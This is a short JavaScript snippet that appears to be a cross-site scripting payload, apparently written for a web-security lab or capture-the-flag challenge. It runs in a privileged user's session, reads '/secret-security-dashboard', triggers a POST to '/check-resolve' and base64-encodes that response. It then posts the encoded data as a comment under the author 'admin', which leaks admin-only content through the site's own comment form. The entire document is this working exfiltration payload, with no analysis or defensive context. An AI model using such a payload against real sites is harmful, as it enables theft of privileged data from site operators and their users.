// Step 1: Fetch data from '/secret-security-dashboard'
fetch("/secret-security-dashboard")
  .then(response => response.text()) 
  .then(adminData => {
    // Step 2: Send POST request to '/check-resolve' with body 'id=1'
    return fetch("/check-resolve", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: "id=1", // You're sending 'id=1' to check-resolve endpoint
    })
    .then(response => response.text())
    .then(checkResolveData => {
      // Step 3: Encode the response from check-resolve and post it to '/post-comment'
      const postData = new URLSearchParams({
        comment2: btoa(checkResolveData), // Encode checkResolveData to Base64
        "comment-author": "admin" // Author set as 'admin'
      });
      return fetch("/post-comment", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: postData,
      });
    });
  })
  .then(response => response.text())
  .then(finalResult => {
    console.log("Post result:", finalResult); // Log the final POST response
  })
  .catch(error => {
    console.error("There was a problem with the fetch operation:", error);
  });
